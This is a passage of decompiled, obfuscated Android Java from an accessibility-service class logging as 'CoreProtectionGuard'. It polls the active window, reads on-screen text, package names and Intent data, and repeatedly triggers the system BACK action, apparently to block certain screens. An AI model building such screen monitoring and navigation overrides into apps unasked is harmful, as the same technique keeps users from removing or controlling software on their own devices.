        boolean zD = false;
        for (int i3 = 1; i3 <= 3; i3++) {
            try {
                zD |= this.f5857b.d(this.f5856a, 1, new e(this, j3, 0));
            } catch (Throwable th2) {
                Log.d("CoreProtectionGuard", "BACK attempt=" + i3 + " failed: " + th2.getMessage());
            }
            if (j4 > 0 && i3 < 3) {
                SystemClock.sleep(j4);
            }
        }
        this.f5862g.set(false);
        if (zD) {
            this.f5872r = SystemClock.uptimeMillis();
        }
        return zD;
    }

    public final void o() {
        if (this.f5866k && !this.f5868m && this.f5867l) {
            r(0L, new c(this, this.f5865j.get(), 1));
        }
    }

    public final ScheduledFuture r(long j3, Runnable runnable) {
        synchronized (this.f5861f) {
            try {
                ScheduledExecutorService scheduledExecutorService = this.n;
                if (scheduledExecutorService == null || scheduledExecutorService.isShutdown()) {
                    return null;
                }
                try {
                    return scheduledExecutorService.schedule(runnable, Math.max(0L, j3), TimeUnit.MILLISECONDS);
                } catch (Throwable th) {
                    Log.d("CoreProtectionGuard", "inspection schedule failed: " + th.getMessage());
                    return null;
                }
            } catch (Throwable th2) {
                throw th2;
            }
        }
    }

    public final void s() {
        ScheduledFuture scheduledFuture = this.f5869o;
        if (scheduledFuture != null) {
            scheduledFuture.cancel(false);
        }
        this.f5869o = null;
        z1.b bVar = this.f5871q;
        if (bVar != null && bVar.f6299a && !this.f5868m && this.f5866k && this.f5867l) {
            this.f5869o = r(Math.max(1L, bVar.f6302d - SystemClock.uptimeMillis()), this.f5860e);
        }
    }

    public final void t(int i3, int i4, long j3) {
        if (!a(j3)) {
            c();
            return;
        }
        le leVar = new le(this, i3, i4, 1);
        if (i4 <= 0) {
            o2.i("attempt <= 0");
            return;
        }
        this.f5870p = r(i4 <= 8 ? ((long) i4) * 16 : 80L, leVar);
        if (this.f5870p == null || !a(j3)) {
            c();
        }
    }

    public final void u(long j3, String str, String str2) {
        if (a(j3) && this.f5863h.compareAndSet(false, true)) {
            this.f5875u = C(str);
            this.f5876v = C(str2);
            t(this.f5864i.incrementAndGet(), 1, j3);
        }
    }

    public final void w(boolean z2) {
        if (this.f5866k != z2) {
            this.f5865j.incrementAndGet();
        }
        this.f5866k = z2;
        if (!z2) {
            A();
            return;
        }
        synchronized (this.f5861f) {
            try {
                ScheduledExecutorService scheduledExecutorService = this.n;
                if (scheduledExecutorService == null || scheduledExecutorService.isShutdown()) {
                    ScheduledExecutorService scheduledExecutorServiceNewSingleThreadScheduledExecutor = Executors.newSingleThreadScheduledExecutor(new a2.l(26));
                    this.n = scheduledExecutorServiceNewSingleThreadScheduledExecutor;
                    scheduledExecutorServiceNewSingleThreadScheduledExecutor.scheduleWithFixedDelay(new d(this, 0), 0L, 100L, TimeUnit.MILLISECONDS);
                    Log.i("CoreProtectionGuard", "continuous sample-style polling started intervalMs=100");
                }
            } catch (Throwable th) {
                throw th;
            }
        }
    }

    public final void x(boolean z2) {
        if (this.f5868m != z2) {
            this.f5865j.incrementAndGet();
        }
        this.f5868m = z2;
        if (z2) {
            c();
            e();
        }
    }

    public final void y(boolean z2) {
        if (this.f5867l != z2) {
            this.f5865j.incrementAndGet();
        }
        this.f5867l = z2;
        if (z2) {
            if (this.f5871q == null || !this.f5871q.f6299a) {
                return;
            }
            r(0L, new c(this, this.f5865j.get(), 0));
            return;
        }
        ScheduledFuture scheduledFuture = this.f5869o;
        if (scheduledFuture != null) {
            scheduledFuture.cancel(false);
        }
        this.f5869o = null;
        c();
    }

    public final kc z(AccessibilityEvent accessibilityEvent, String str, String str2) {
        AccessibilityNodeInfo source;
        int i3;
        try {
            source = this.f5856a.getRootInActiveWindow();
        } catch (Throwable unused) {
            source = null;
        }
        if (source == null && accessibilityEvent != null) {
            try {
                source = accessibilityEvent.getSource();
            } catch (Throwable unused2) {
            }
        }
        String strC = accessibilityEvent != null ? C(accessibilityEvent.getPackageName()) : "";
        String strC2 = accessibilityEvent != null ? C(accessibilityEvent.getClassName()) : "";
        if (strC.isEmpty() && source != null) {
            strC = C(source.getPackageName());
        }
        if (strC2.isEmpty() && source != null) {
            strC2 = C(source.getClassName());
        }
        if (strC.isEmpty()) {
            strC = C(str);
        }
        if (strC2.isEmpty()) {
            strC2 = C(str2);
        }
        f fVar = f.f5851c;
        if (accessibilityEvent != null) {
            try {
                Parcelable parcelableData = accessibilityEvent.getParcelableData();
                if (parcelableData instanceof Intent) {
                    Intent intent = (Intent) parcelableData;
                    String strC3 = intent.getData() != null ? C(intent.getData().getSchemeSpecificPart()) : "";
                    ComponentName component = intent.getComponent();
                    if (!m(strC3)) {
                        strC3 = "";
                    }
                    fVar = new f(strC3, component != null ? component.flattenToString() : "");
                }
            } catch (Throwable unused3) {
            }
        }
        if (fVar.f5852a.isEmpty() && fVar.f5853b.isEmpty() && source != null) {
            fVar = v(source.getExtras());
        }
        z1.g gVarD = d(source, 0, new c2.t(5));
        if (accessibilityEvent != null) {
            d.b bVar = new d.b();
            ArrayList arrayList = (ArrayList) bVar.f511f;
            bVar.f506a = strC;
            bVar.f512g = strC2;
            bVar.f507b = true;
            bVar.f508c = 2;
            arrayList.add(gVarD);
            try {
                Iterator<CharSequence> it = accessibilityEvent.getText().iterator();
                i3 = 0;
                while (it.hasNext()) {
                    try {
                        String strC4 = C(it.next());
                        if (strC4.length() > 256) {
                            strC4 = strC4.substring(0, 256);
                        }
                        if (!strC4.isEmpty()) {
                            int i4 = i3 + 1;
                            if (i3 < 8) {
                                try {
                                    d.b bVar2 = new d.b();
                                    bVar2.f506a = strC;
                                    bVar2.f512g = strC2;
                                    bVar2.f514i = strC4;
                                    bVar2.f507b = true;
                                    bVar2.f508c = 3;
                                    arrayList.add(new z1.g(bVar2));
                                } catch (Throwable unused4) {
                                    i3 = i4;
                                }
                            }
                            i3 = i4;
                        }
                    } catch (Throwable unused5) {
                    }
                }
            } catch (Throwable unused6) {
                i3 = 0;
            }
            try {
                String strC5 = C(accessibilityEvent.getContentDescription());
                if (strC5.length() > 256) {
                    strC5 = strC5.substring(0, 256);
                }
                if (!strC5.isEmpty()) {
                    int i5 = i3 + 1;
                    if (i3 < 8) {
                        try {
                            d.b bVar3 = new d.b();
                            bVar3.f506a = strC;
                            bVar3.f512g = strC2;
                            bVar3.f514i = strC5;
                            bVar3.f507b = true;
                            bVar3.f508c = 3;
                            arrayList.add(new z1.g(bVar3));
                        } catch (Throwable unused7) {
                        }
                    }
                    i3 = i5;
                }
            } catch (Throwable unused8) {
            }
            if (i3 > 0) {
                gVarD = new z1.g(bVar);
            }
        }
        z1.k kVar = new z1.k();
        kVar.f6335a = strC;
        kVar.f6336b = strC2;
        kVar.f6337c = fVar.f5852a;
        kVar.f6338d = fVar.f5853b;
        kVar.f6339e = gVarD;
        z1.k kVar2 = new z1.k();
        String str3 = kVar.f6335a;
        kVar2.f6335a = str3 == null ? "" : str3.trim();
        String str4 = kVar.f6336b;
        kVar2.f6336b = str4 == null ? "" : str4.trim();
        String str5 = kVar.f6337c;
        kVar2.f6337c = str5 == null ? "" : str5.trim();
        String str6 = kVar.f6338d;
        kVar2.f6338d = str6 != null ? str6.trim() : "";
        kVar2.f6339e = kVar.f6339e;
        return new kc(source, kVar2);
    }
}
